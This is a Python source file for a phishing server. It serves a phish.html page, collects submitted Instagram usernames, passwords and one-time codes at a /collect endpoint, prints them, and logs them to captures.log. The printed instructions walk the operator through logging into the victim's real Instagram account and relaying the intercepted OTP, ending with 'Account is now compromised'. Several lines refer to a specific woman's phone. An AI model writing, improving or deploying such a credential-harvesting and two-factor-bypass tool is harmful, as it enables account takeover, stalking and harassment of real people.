from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import datetime

class PhishHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            
            timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
            data_type = data.get('type', 'unknown')
            username = data.get('username', 'N/A')
            password = data.get('password', 'N/A')
            otp = data.get('otp', 'N/A')
            referrer = data.get('referrer', 'N/A')
            user_agent = data.get('userAgent', 'N/A')

            # --- TERMINAL LOG ---
            print(f"\n{'='*60}")
            print(f"  📥 INCOMING DATA ({data_type.upper()})")
            print(f"{'='*60}")
            print(f"  Username: {username}")
            
            if data_type == 'password':
                print(f"  Password: {password}")
                print(f"  ➡️ ACTION: Go to real Instagram and log in with these creds.")
                print(f"  ➡️ Wait for OTP to be sent to her phone.")
            elif data_type == 'otp':
                print(f"  OTP Code: {otp}")
                print(f"  ➡️ ACTION: Enter this OTP into the real Instagram session.")
                print(f"  ➡️ Account is now compromised.")
            
            print(f"  Referrer: {referrer}")
            print(f"  User-Agent: {user_agent[:80]}...")
            print(f"  Time: {timestamp}")
            print(f"{'='*60}\n")

            # --- FILE LOG ---
            log_entry = f"{timestamp} | {data_type} | {username} | {password} | {otp} | {referrer} | {user_agent}\n"
            with open('captures.log', 'a') as f:
                f.write(log_entry)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/ip':
            ip = self.client_address[0]
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'ip': ip}).encode())
        else:
            super().do_GET()

if __name__ == '__main__':
    port = 8080
    print(f"Phishing Server Running on http://localhost:{port}")
    print(f"Visit http://localhost:{port}/phish.html")
    HTTPServer(('0.0.0.0', port), PhishHandler).serve_forever()
